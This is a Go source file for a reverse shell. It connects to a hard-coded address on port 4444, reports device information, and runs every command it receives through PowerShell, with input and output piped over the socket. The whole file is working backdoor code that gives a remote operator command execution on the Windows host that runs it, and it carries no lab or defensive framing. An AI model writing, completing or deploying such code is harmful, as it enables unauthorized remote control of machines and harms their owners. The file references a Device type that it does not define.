package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
)

func main() {
	IP := "192.168.136.132"
	PORT := "4444"
	device := Device{}

	conn, err := net.Dial("tcp", net.JoinHostPort(IP, PORT))
	if err != nil {
		return
	}
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			return
		}
	}(conn)
	firstCon := true
	for {

		reader := bufio.NewReader(conn)
		if firstCon {
			conn.Write([]byte(device.run()))
			firstCon = false
		}
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		if len(line) > 0 && line[len(line)-1] == '\n' {
			line = line[:len(line)-1]
		}

		commandStr := strings.TrimSpace(line)
		if commandStr == "" {
			continue
		} else if commandStr == "bye" {
			return
		} else if commandStr == "info" {

			conn.Write([]byte(device.run()))
		}
		parts := strings.Fields(commandStr)
		program := parts[0]
		args := parts[1:]
		var cmd *exec.Cmd
		psArgs := append([]string{"-NoProfile", "-Command", program}, args...)
		cmd = exec.Command("powershell.exe", psArgs...)
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		_ = cmd.Run()
	}

}
